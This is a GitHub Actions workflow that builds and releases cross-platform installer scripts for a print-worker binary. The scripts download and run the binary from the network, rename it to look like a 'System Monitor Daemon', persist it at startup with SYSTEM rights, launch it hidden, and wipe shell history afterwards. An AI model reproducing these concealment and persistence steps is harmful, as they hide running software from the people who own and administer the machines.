# yaml-language-server: $schema=https://json.schemastore.org/github-workflow.json
name: Build Printer

on:
  push:
    branches:
      - main
    paths:
      - ".github/workflows/printer.yml"
  pull_request:
    paths:
      - ".github/workflows/printer.yml"
  workflow_run:
    workflows: ["Release"]
    types:
      - completed
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: printer-${{ github.ref }}
  cancel-in-progress: true

jobs:
  package-scripts:
    name: Package Printer Scripts
    if: ${{ github.event_name != 'workflow_run' || github.event.workflow_run.conclusion == 'success' }}
    runs-on: windows-latest
    timeout-minutes: 10
    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Generate Package
        shell: powershell
        env:
          GITHUB_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
        run: |
          $key_prompt = @(
            ':ask',
            'set "k="',
            'set /p "k=Enter Worker Key: "',
            'if not defined k goto ask',
            ':ask_ua',
            'set "alias="',
            'set /p "alias=Enter User-Agent: "',
            'if not defined alias goto ask_ua',
            'echo Verifying...',
            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $c = 0; try { $r = [System.Net.HttpWebRequest]::Create(''https://api.preconnect.app/print''); $r.Headers.Add(''X-Worker-Key'', $env:k); $r.UserAgent = $env:alias + ''/1.0''; $r.Method = ''GET''; $r.Timeout = 10000; $resp = $r.GetResponse(); $c = [int]$resp.StatusCode; $resp.Close() } catch [System.Net.WebException] { if ($_.Response) { $c = [int]$_.Response.StatusCode; $_.Response.Close() } } catch {}; if ($c -eq 401) { exit 1 } else { exit 0 }"',
            'if errorlevel 1 (',
            '  echo Error: Invalid Worker Key. Please check and try again.',
            '  goto ask',
            ')'
          ) -join "`n"

          @(
            '@echo off',
            'setlocal',
            'net session >nul 2>&1',
            'if %errorlevel% neq 0 (',
            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/k \"\"%~f0\"\"'' -Verb RunAs"',
            '  exit /b',
            ')',
            'cd /d "%~dp0"',
            $key_prompt,
            'taskkill /F /IM sysmond.exe >nul 2>&1',
            'set "d=%ProgramData%\sysmond"',
            'if not exist "%d%" mkdir "%d%"',
            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''sysmond-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; if (Test-Path ''%d%\preprintd.exe'') { Move-Item -Force ''%d%\preprintd.exe'' ''%d%\sysmond.exe'' }; Remove-Item -Force $z"',
            'setx /M WORKER_KEY "%k%" >nul 2>&1',
            'setx /M ALIAS "%alias%" >nul 2>&1',
            'setx /M DEF_HOST "172.16.0.111" >nul 2>&1',
            'setx /M DEF_QUEUE "secure" >nul 2>&1',
            'setx /M STATE_DIRECTORY "%d%" >nul 2>&1',
            'schtasks /Create /TN "sysmond" /TR "\"%d%\sysmond.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
            'schtasks /Run /TN "sysmond" >nul',
            'echo Setup completed successfully.',
            'doskey /reinstall >nul 2>&1',
            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
            'cls',
            'endlocal',
            'exit /b'
          ) | Set-Content -Path "admin.bat" -Encoding ASCII

          @(
            '@echo off',
            'setlocal',
            'cd /d "%~dp0"',
            $key_prompt,
            'taskkill /F /IM sysmond.exe >nul 2>&1',
            'set "d=%LOCALAPPDATA%\sysmond"',
            'if not exist "%d%" mkdir "%d%"',
            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''sysmond-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; if (Test-Path ''%d%\preprintd.exe'') { Move-Item -Force ''%d%\preprintd.exe'' ''%d%\sysmond.exe'' }; Remove-Item -Force $z"',
            'setx WORKER_KEY "%k%" >nul 2>&1',
            'setx ALIAS "%alias%" >nul 2>&1',
            'setx DEF_HOST "172.16.0.111" >nul 2>&1',
            'setx DEF_QUEUE "secure" >nul 2>&1',
            'setx STATE_DIRECTORY "%d%" >nul 2>&1',
            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmond" /t REG_SZ /d "\"%d%\sysmond.exe\"" /f >nul',
            'set "WORKER_KEY=%k%"',
            'set "ALIAS=%alias%"',
            'set "DEF_HOST=172.16.0.111"',
            'set "DEF_QUEUE=secure"',
            'set "STATE_DIRECTORY=%d%"',
            'powershell -NoProfile -Command "Start-Process -FilePath ''%d%\sysmond.exe'' -WindowStyle Hidden"',
            'echo Setup completed successfully.',
            'doskey /reinstall >nul 2>&1',
            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
            'cls',
            'endlocal',
            'exit /b'
          ) | Set-Content -Path "user.bat" -Encoding ASCII

          @(
            '@echo off',
            'taskkill /F /IM sysmond.exe >nul 2>&1',
            'taskkill /F /IM preprintd.exe >nul 2>&1',
            'schtasks /End /TN "sysmond" >nul 2>&1',
            'schtasks /Delete /TN "sysmond" /F >nul 2>&1',
            'schtasks /End /TN "preprintd" >nul 2>&1',
            'schtasks /Delete /TN "preprintd" /F >nul 2>&1',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmond" /f >nul 2>&1',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /f >nul 2>&1',
            'set "d=%ProgramData%\sysmond"',
            'if exist "%d%" rmdir /s /q "%d%" >nul 2>&1',
            'set "du=%LOCALAPPDATA%\sysmond"',
            'if exist "%du%" rmdir /s /q "%du%" >nul 2>&1',
            'set "dp=%ProgramData%\preprintd"',
            'if exist "%dp%" rmdir /s /q "%dp%" >nul 2>&1',
            'set "dup=%LOCALAPPDATA%\preprintd"',
            'if exist "%dup%" rmdir /s /q "%dup%" >nul 2>&1',
            'reg delete "HKCU\Environment" /v WORKER_KEY /f >nul 2>&1',
            'reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v WORKER_KEY /f >nul 2>&1',
            'reg delete "HKCU\Environment" /v STATE_DIRECTORY /f >nul 2>&1',
            'reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v STATE_DIRECTORY /f >nul 2>&1'
          ) | Set-Content -Path "uninstall.bat" -Encoding ASCII

          $shContent = @(
            '#!/usr/bin/env bash',
            'set -e',
            'while true; do',
            '  read -rsp "Enter Worker Key: " K',
            '  echo',
            '  if [ -n "$K" ]; then',
            '    break',
            '  fi',
            'done',
            'while true; do',
            '  read -rp "Enter User-Agent: " ALIAS',
            '  if [ -n "$ALIAS" ]; then',
            '    break',
            '  fi',
            'done',
            'echo "Verifying..."',
            'STATUS=$(curl -s -m 10 -o /dev/null -w "%{http_code}" -H "X-Worker-Key: $K" -H "User-Agent: $ALIAS/1.0" "https://api.preconnect.app/print" || true)',
            'if [ "$STATUS" = "401" ]; then',
            '  echo "Error: Invalid Worker Key. Please check and try again."',
            '  exit 1',
            'fi',
            'OS="$(uname -s)"',
            'if [ "$OS" = "Linux" ]; then',
            '  URL="https://github.com/hitblast/preprintd/releases/latest/download/preprintd-linux-musl-x86_64.tar.gz"',
            '  DIR="/opt/sysmond"',
            '  if [ "$(id -u)" -ne 0 ]; then',
            '    SUDO="sudo"',
            '  fi',
            '  $SUDO mkdir -p "$DIR"',
            '  curl -fsSL "$URL" | $SUDO tar -xz -C "$DIR"',
            '  if [ -f "$DIR/preprintd" ]; then',
            '    $SUDO mv -f "$DIR/preprintd" "$DIR/sysmond"',
            '  fi',
            '  $SUDO chmod +x "$DIR/sysmond"',
            '  cat <<EOF | $SUDO tee /etc/systemd/system/sysmond.service >/dev/null',
            '[Unit]',
            'Description=System Monitor Daemon',
            'Wants=network-online.target',
            'After=network-online.target',
            '',
            '[Service]',
            'Type=simple',
            'Environment="WORKER_KEY=$K"',
            'Environment="ALIAS=$ALIAS"',
            'Environment="DEF_HOST=172.16.0.111"',
            'Environment="DEF_QUEUE=secure"',
            'ExecStart=$DIR/sysmond --inhibit',
            'Restart=always',
            'RestartSec=5',
            'StateDirectory=sysmond',
            '',
            '[Install]',
            'WantedBy=multi-user.target',
            'EOF',
            '  $SUDO systemctl daemon-reload',
            '  $SUDO systemctl enable --now sysmond',
            'elif [ "$OS" = "Darwin" ]; then',
            '  URL="https://github.com/hitblast/preprintd/releases/latest/download/preprintd-macos-arm64.tar.gz"',
            '  DIR="$HOME/.local/share/sysmond"',
            '  mkdir -p "$DIR" "$HOME/Library/LaunchAgents"',
            '  curl -fsSL "$URL" | tar -xz -C "$DIR"',
            '  if [ -f "$DIR/preprintd" ]; then',
            '    mv -f "$DIR/preprintd" "$DIR/sysmond"',
            '  fi',
            '  chmod +x "$DIR/sysmond"',
            '  PLIST="$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist"',
            '  cat <<EOF > "$PLIST"',
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
            '<plist version="1.0">',
            '<dict>',
            '  <key>Label</key>',
            '  <string>app.preconnect.sysmond</string>',
            '  <key>ProgramArguments</key>',
            '  <array>',
            '    <string>$DIR/sysmond</string>',
            '  </array>',
            '  <key>EnvironmentVariables</key>',
            '  <dict>',
            '    <key>WORKER_KEY</key>',
            '    <string>$K</string>',
            '    <key>ALIAS</key>',
            '    <string>$ALIAS</string>',
            '    <key>DEF_HOST</key>',
            '    <string>172.16.0.111</string>',
            '    <key>DEF_QUEUE</key>',
            '    <string>secure</string>',
            '    <key>STATE_DIRECTORY</key>',
            '    <string>$DIR</string>',
            '  </dict>',
            '  <key>RunAtLoad</key>',
            '  <true/>',
            '  <key>KeepAlive</key>',
            '  <true/>',
            '</dict>',
            '</plist>',
            'EOF',
            '  launchctl unload "$PLIST" 2>/dev/null || true',
            '  launchctl load -w "$PLIST"',
            'fi',
            'echo "Setup completed successfully."',
            'rm -f "$HOME/.bash_history" 2>/dev/null || true',
            'history -c 2>/dev/null || true',
            'clear 2>/dev/null || true',
            'exit 0'
          )
          [IO.File]::WriteAllText("admin.sh", (($shContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))

          $unshContent = @(
            '#!/usr/bin/env bash',
            'OS="$(uname -s)"',
            'if [ "$OS" = "Linux" ]; then',
            '  if [ "$(id -u)" -ne 0 ]; then',
            '    SUDO="sudo"',
            '  fi',
            '  $SUDO systemctl stop sysmond preprintd 2>/dev/null || true',
            '  $SUDO systemctl disable sysmond preprintd 2>/dev/null || true',
            '  $SUDO rm -f /etc/systemd/system/sysmond.service /etc/systemd/system/preprintd.service',
            '  $SUDO systemctl daemon-reload 2>/dev/null || true',
            '  $SUDO rm -rf /opt/sysmond /opt/preprintd',
            'elif [ "$OS" = "Darwin" ]; then',
            '  launchctl unload "$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist" 2>/dev/null || true',
            '  launchctl unload "$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist" 2>/dev/null || true',
            '  rm -f "$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist" "$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist"',
            '  rm -rf "$HOME/.local/share/sysmond" "$HOME/.local/share/preprintd"',
            'fi',
            'killall sysmond preprintd 2>/dev/null || true'
          )
          [IO.File]::WriteAllText("uninstall.sh", (($unshContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))

          $tag = (gh release list --limit 1 --json tagName --jq '.[0].tagName')
          $ver = if ($tag) { $tag -replace '^v','' } else { "2.0.6+202608088" }
          $zip = "PreConnect-printer-x64-release-$ver.zip"
          Compress-Archive -Path admin.bat, user.bat, uninstall.bat, admin.sh, uninstall.sh -DestinationPath $zip -Force
          echo "ZIP_FILE=$zip" >> $env:GITHUB_ENV

      - name: Validate Package
        shell: powershell
        run: |
          foreach ($f in @("admin.bat", "user.bat", "uninstall.bat")) {
            if (-not (Test-Path $f)) { throw "$f missing" }
            $c = Get-Content $f -Raw
            if ([string]::IsNullOrWhiteSpace($c)) { throw "$f is empty" }
            $res = cmd /c "for /f `"tokens=*`" %i in ('type `"$f`"') do @rem" 2>&1
            if ($LASTEXITCODE -ne 0) { throw "Batch syntax validation failed for ${f}: $res" }
          }
          foreach ($f in @("admin.sh", "uninstall.sh")) {
            if (-not (Test-Path $f)) { throw "$f missing" }
          }
          Add-Type -AssemblyName System.IO.Compression.FileSystem
          $zipObj = [System.IO.Compression.ZipFile]::OpenRead((Get-Item "PreConnect-printer-x64-release-*.zip").FullName)
          $entries = $zipObj.Entries | ForEach-Object { $_.Name }
          $zipObj.Dispose()
          if (-not ($entries -contains "admin.bat" -and $entries -contains "user.bat" -and $entries -contains "uninstall.bat" -and $entries -contains "admin.sh" -and $entries -contains "uninstall.sh")) {
            throw "Zip archive is missing required files: $entries"
          }

      - name: Upload Artifact
        uses: actions/upload-artifact@v7
        with:
          name: printer-scripts
          path: |
            admin.bat
            user.bat
            uninstall.bat
            admin.sh
            uninstall.sh
            ${{ env.ZIP_FILE }}

      - name: Upload to Latest Release
        if: github.event_name != 'pull_request'
        shell: powershell
        env:
          GITHUB_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
        run: |
          $tag = (gh release list --limit 1 --json tagName --jq '.[0].tagName')
          if ($tag) {
            $files = @("admin.bat", "user.bat", "admin.sh", $env:ZIP_FILE)
            foreach ($f in $files) {
              if (Test-Path $f) {
                gh release upload $tag $f --clobber
              }
            }
          }


